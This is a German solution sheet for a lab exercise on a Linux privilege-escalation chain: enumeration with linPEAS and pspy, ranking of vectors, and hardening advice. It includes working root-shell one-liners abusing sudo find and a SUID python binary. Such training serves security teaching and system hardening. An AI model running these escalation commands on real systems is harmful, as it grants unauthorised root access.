# Lösung – Übung 10: Vollständige PrivEsc-Kette

Beispiel-Durchlauf. `privesc-report-template.md` ist das Gerüst.

## 1. Enumeration

```bash
id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /etc/crontab; uname -a
# automatisiert:
./linpeas.sh | tee linpeas.txt
./pspy64 &
```
Alle Funde in eine Vektor-Liste.

## 2. Priorisierung

Reihenfolge nach Zuverlässigkeit/Risiko:
1. **sudo-Misconfig** (sofort, risikolos)
2. **SUID-Binary** (sofort)
3. **Cron writable** (warten)
4. **Kernel-Exploit** (crash-Risiko → letztes Mittel)

## 3. Exploitation + Nachweis

```bash
sudo find . -exec /bin/sh \; -quit
id      # uid=0(root)  -> Nachweis
```

## 4. Alternativweg

```bash
# SUID-python als zweiter Vektor:
python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'   # falls SUID
id
```
Mindestens einen zweiten Vektor benennen/zeigen (Redundanz = realistischer Bericht).

## 5. Hardening-Report

`privesc-report-template.md` ausfüllen: je Vektor **Ursache (Misconfig) → Nachweis → Fix**, priorisiert. Enumeration-Output + Befehle in den Anhang.

## Gegenmaßnahmen (gebündelt)

- **least privilege** (sudo/SUID/Gruppen minimal), sichere Dateirechte, **Patch-Management** (Kernel/Dienste), regelmäßiges **Self-Audit** mit linPEAS/winPEAS, Monitoring (neue SUID, Service-Änderungen), keine Klartext-Creds.

## Häufige Fehler / Troubleshooting

- **Nur ein Vektor im Report:** reale Härtung braucht alle Ursachen, nicht nur den genutzten Weg.
- **Kernel zuerst probiert:** erst Konfig-Vektoren (risikolos) – Kernel nur wenn nötig + Snapshot.
- **Kein Nachweis:** immer `id`/`whoami` als Beleg mitdokumentieren.
- **Kette reißt:** Snapshots nutzen; PrivEsc-Schritte sind teils destruktiv.
